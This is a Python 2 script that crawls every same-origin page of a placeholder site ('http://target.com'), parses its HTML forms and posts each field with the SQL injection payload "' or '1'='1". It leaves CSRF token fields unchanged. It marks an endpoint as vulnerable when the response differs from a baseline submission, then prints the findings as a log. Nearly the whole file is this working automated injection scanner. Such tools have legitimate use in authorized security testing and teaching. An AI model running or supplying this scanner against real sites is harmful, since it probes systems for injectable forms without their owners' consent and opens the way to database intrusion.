import httplib2, urllib, urllib2
from BeautifulSoup import BeautifulSoup, SoupStrainer
from urlparse import urljoin, urlparse
from sets import Set

ORIGIN = 'http://target.com'

def same_origin(url1, url2):
    first_url = urlparse(url1)
    second_url = urlparse(url2)
    return first_url.scheme == second_url.scheme and first_url.netloc == second_url.netloc and first_url.port == second_url.port

def visit_url(url):
    http = httplib2.Http()
    status, response = http.request(url)
    links = []
    for link in BeautifulSoup(response, parseOnlyThese=SoupStrainer('a')):
        if link.has_key('href'):
            links.append((url, link['href']))
    return links

visited = Set([])
def crawl(start, origin):
    global visited
    stack = [(origin,start)]
    while len(stack) != 0:
        current_origin, current_start = stack.pop()
        current_url = urljoin(current_origin, current_start)
        if same_origin(current_url, ORIGIN) and current_url not in visited:
            visited.add(current_url)
            new_urls = visit_url(current_url)
            stack = new_urls + stack

def has_form(html_page):
    return len(BeautifulSoup(html_page, parseOnlyThese=SoupStrainer('form'))) != 0

def parse_form(soup):
    form = soup.find('form')
    attributes = []
    for form_input in form.findAll('input'):
        attribute = ()
        for form_input_attr in form_input.attrs:
            if form_input_attr[0] != 'type':
                if form_input_attr[0] == "name":
                    attribute = (form_input_attr[1], "")
                elif form_input_attr[0] == "value":
                    attribute = (attribute[0], form_input_attr[1])
        if len(attribute) > 0:
            attributes.append(attribute)
    return attributes

def create_params(params):
    values = {}
    for attr in params:
        if attr[1] == "":
            values[attr[0]] = "a"
        else:
            values[attr[0]] = attr[1]
    return values

def post_request(url, params):
    values = create_params(params)
    data = urllib.urlencode(values)
    req = urllib2.Request(url, data)
    rsp = urllib2.urlopen(req)
    return rsp.read()

def log_results(results, category):
    log = {}
    log["class"] = category
    log["results"] = {}
    processed_results = []
    for result in results:
        processed_result = {}
        processed_result["endpoint"] = result[0]
        processed_result["params"] = result[1]
        processed_result["method"] = result[2]
        processed_results.append(processed_result)
    log["results"][ORIGIN] = processed_results
    return log

def sqli_injection(web_pages):
    results = []
    for web_page in web_pages:
        http = httplib2.Http()
        status, response = http.request(web_page)
        if has_form(response):
            soup = BeautifulSoup(response)
            forms = parse_form(soup)
            original_response = post_request(web_page, forms)
            sqli_injection_forms = []
            for form_input in forms:
                if form_input[0] == "csrftoken": # We don't have incentive to change this
                    sqli_injection_forms.append(form_input)
                else:
                    sqli_injection_forms.append((form_input[0], "' or '1'='1"))
            new_response = post_request(web_page, sqli_injection_forms)
            if original_response != new_response: # That means that the webpage is different, possibly a successful case
                results.append((urlparse(web_page).path, create_params(sqli_injection_forms), "POST"))
    return log_results(results, "SQL Injection")


if __name__ == '__main__':
    crawl(ORIGIN, ORIGIN)
    all_web_pages = list(visited)
    all_web_pages.sort()
    sqli_log = sqli_injection(all_web_pages)
    print(sqli_log)